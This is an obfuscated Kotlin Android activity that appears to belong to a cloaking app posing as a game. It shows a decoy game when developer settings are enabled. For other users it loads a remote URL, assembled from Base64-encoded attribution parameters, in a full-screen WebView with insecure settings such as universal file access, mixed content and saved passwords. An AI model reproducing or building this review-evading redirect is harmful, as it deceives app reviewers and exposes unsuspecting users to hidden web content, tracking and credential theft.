package com.fnreoz.jroek

import android.annotation.SuppressLint
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.View
import android.webkit.*
import com.fnreoz.jroek.Webocka.*
import com.fnreoz.jroek.Game.StArT
import com.onesignal.OneSignal
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.util.*

var origabq: String? = null
var teskqs = Parischokks()
@DelicateCoroutinesApi
class FJ : AppCompatActivity() {
    private var uyhls: ValueCallback<Array<Uri>>? = null
    private val lcojqns = 100
    var yeqweq = Ad_Apps_FB()
    var liwqwns = darikdatats()
    lateinit var wekamq: WebView
    var lasters: String? = null

    override fun onCreate(sysyq: Bundle?) {
        super.onCreate(sysyq)
        setContentView(R.layout.activity_main)
        wekamq = findViewById(R.id.webecha)
        window.addFlags(1024)
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(teskqs.Liqsresa(onOAnsensa))
        yeqweq.getikqbs(applicationContext)
        yeqweq.starik(this)
        val projectCore = getPreferences(Context.MODE_PRIVATE)
        lasters = projectCore.getString("klark-143", null)



        webecha.webViewClient = object : WebViewClient() {
            override fun onPageStarted(wiqms: WebView?, aoqk: String?, losnq: Bitmap?) {
                super.onPageStarted(wiqms, aoqk, losnq)
                progrees.visibility = View.INVISIBLE
                txt_Load.visibility = View.INVISIBLE
                if (aoqk?.contains(teskqs.Liqsresa("Z2FwcHM9NDA0")) == true) startGG()
            }

            @SuppressLint("CommitPrefEdits")
            override fun onPageFinished(yehq: WebView?, oqke: String?) {
                super.onPageFinished(yehq, oqke)
                projectCore.edit().putString("klark-143", oqke).apply()

            }
        }


        webecha.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                wyqhs: WebView?,
                loajq: ValueCallback<Array<Uri>>?,
                lqos: FileChooserParams?
            ): Boolean {
                if (uyhls != null) {
                    uyhls!!.onReceiveValue(null)
                    uyhls = null
                }
                uyhls = loajq
                try {
                    ShoosikFileActiv()
                } catch (ert: ActivityNotFoundException) {
                    uyhls = null
                    return false
                }
                return true
            }
        }

        if (Lakqjns() == 0) {
            GlobalScope.launch {
                liwqwns.gisterhna()
                val bfqw = liwqwns.fbfbbfbq
                teskqs.JoqFA(bfqw!!, applicationContext)
                if (lasters != null) {
                    runOnUiThread(Runnable {
                        startWebocka(lasters.toString())
                    })
                } else {
                    Handler(Looper.getMainLooper()).postDelayed({
                        tetoiajq(
                            liwqwns.linceaks!!,
                            liwqwns.keoqs!!, fb1webocha, this@FJ
                        )
                    }, 5000)
                }
            }
        } else { startGG() }

    }
    override fun onBackPressed() {
        if (webecha.isFocused && webecha.canGoBack()) {
            webecha.goBack()
        }
    }
    override fun onActivityResult(yqsnq: Int, loajqa: Int, loajq: Intent?) {
        super.onActivityResult(yqsnq, loajqa, loajq)
        if (yqsnq == lcojqns) {
            if (uyhls == null) return
            uyhls!!.onReceiveValue(
                WebChromeClient.FileChooserParams.parseResult(
                    loajqa,
                    loajq
                )
            )
            uyhls = null
        }
    }
    private fun ShoosikFileActiv() {
        val compress = Intent(Intent.ACTION_GET_CONTENT)
        compress.addCategory(Intent.CATEGORY_OPENABLE)
        compress.type = "*/*"
        startActivityForResult(
            Intent.createChooser(compress, "File Choosik"),
            lcojqns
        )
    }
    private fun startGG() {
        val inters = Intent(this, StArT::class.java)
        startActivity(inters)
        finish()
    }
    @SuppressLint("SetJavaScriptEnabled")
    fun startWebocka(upikq: String) {
        wekamq.settings.apply {
            setAppCacheEnabled(true)
            allowFileAccessFromFileURLs = true
            saveFormData = true
            mixedContentMode = 0
            savePassword = true
            allowContentAccess = true
            setRenderPriority(WebSettings.RenderPriority.HIGH)
            setEnableSmoothTransition(true)
            loadsImagesAutomatically = true
            allowUniversalAccessFromFileURLs = true
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            javaScriptCanOpenWindowsAutomatically = true
            domStorageEnabled = true
            allowFileAccess = true
            javaScriptEnabled = true
        }
        wekamq.loadUrl(upikq)
    }

    fun tetoiajq(
        kiqls: String,
        kqyebs: String,
        oqisma: String?,
        qnsa: FJ
    ) {
        if (apikqhsfe.equals(teskqs.Liqsresa("Tm9uLW9yZ2FuaWM="))) {
            val lakqm = kiqls + poroghw
            startWebocka(lakqm)
        } else if (oqisma != null) {
            val rejanq = kiqls + oqisma
            startWebocka(rejanq)
        } else {
            if (kqyebs == teskqs.Liqsresa("Tk8=")) {
                val yehqna = Intent(qnsa, StArT::class.java)
                qnsa.startActivity(yehqna)
            } else {
                origabq = kqyebs + teskqs.Liqsresa("P2J1bmRsZT0=") + teskqs.Liqsresa(paunsoso) +
                        teskqs.Liqsresa("JmFkX2lkPQ==") + adikqbhdsx + teskqs.Liqsresa("JmFwcHNfaWQ9") +
                        dodoqs + teskqs.Liqsresa("JmRldl9rZXk9") + teskqs.Liqsresa(
                    afikfjejn
                )
                val laoqm = kiqls + origabq
                startWebocka(laoqm)
            }
        }
    }

    fun Lakqjns(): Int {
        val poeqa: Int = Settings.Secure.getInt(
            this.contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
        )
        return poeqa

    }


}